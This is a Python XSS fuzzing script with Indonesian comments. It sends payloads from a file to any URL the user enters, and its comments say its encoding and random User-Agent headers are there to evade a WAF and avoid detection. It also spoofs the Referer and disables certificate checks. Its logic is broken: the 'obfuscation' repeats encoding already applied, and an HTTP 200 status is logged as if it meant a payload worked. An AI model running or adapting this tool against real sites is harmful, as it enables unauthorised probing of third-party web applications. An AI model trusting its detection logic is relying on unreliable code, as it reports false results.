import requests
from fake_useragent import UserAgent
import time
import pyfiglet
from termcolor import colored
import urllib.parse

def encode_payload(payload):
    # Menjalankan URL encoding di payload agar lolos WAF ya
    return urllib.parse.quote_plus(payload)

def obfuscate_payload(payload):
    # Mengganti bbrp karakter dlm payload utk di-obfuscation
    return payload.replace('<', '%3C').replace('>', '%3E').replace('"', '%22')

def decode_payload(payload):
    # Mendekode payload yg udah di-encode & di-obfuscate sebelumnya
    return urllib.parse.unquote_plus(payload)

def main():
    # Membuat banner
    ascii_banner = pyfiglet.figlet_format("XSS Explorer", width=100)
    print(colored(ascii_banner, 'yellow'))
    ascii_banner_by = pyfiglet.figlet_format("by Cak Mad", font="digital", width=100)
    print(colored(ascii_banner_by, 'yellow'))

    # Membuat User-Agent yg acak agar gak dicurigai oleh WAF
    ua = UserAgent()
    headers = {
        "User-Agent": ua.random,
        "Referer": "http://s3.com"
    }

    # User memasukkan URL lengkap (tmsk endpoint)
    full_url = input("Masukkan URL lengkap (termasuk endpointnya ya mas): ")

    # User menginput delay time
    delay = float(input("Masukkan delay time (0.1 - 9): "))

    # Memastikan delay dalam range
    if delay < 0.1 or delay > 9:
        print("Delay time harus antara 0.1 hingga 9 detik.")
        return

    # Baca payloads dari file
    with open('payloads.txt', 'r') as file:
        payloads = file.readlines()

    # Membuat atau membuka file results.txt
    with open('results.txt', 'w') as result_file:
        # Suntikkan request setiap payload
        for payload in payloads:
            payload = payload.strip()

            # Melakukan encoding & obfuscation pada payload
            encoded_payload = encode_payload(payload)
            obfuscated_payload = obfuscate_payload(encoded_payload)

            try:
                # Mengirim request dgn payload yg udah di-encode & di-obfuscate
                # Kita tambahkan `verify=False` agar lolos verifikasi SSL
                response = requests.get(full_url, headers=headers, params={'q': obfuscated_payload}, verify=False)
                if response.status_code == 200:
                    status_code_msg = colored(f"Status Code: {response.status_code}", 'yellow', attrs=['bold'])

                    # Mendekode kembali payload sebelum menyimpan ke file
                    decoded_payload = decode_payload(obfuscated_payload)
                    result = f"Payload: {decoded_payload} -> {status_code_msg}\n"
                else:
                    status_code_msg = colored(f"Status Code: {response.status_code}", 'red', attrs=['bold'])
                    result = f"Payload: {obfuscated_payload} -> {status_code_msg}\n"

                print(result)
                result_file.write(result)
            except Exception as e:
                error_msg = colored(f"Terjadi kesalahan: {e}", 'red')
                print(error_msg)
                result_file.write(error_msg + "\n")

            # Atur delay di antara request
            time.sleep(delay)

if __name__ == "__main__":
    main()
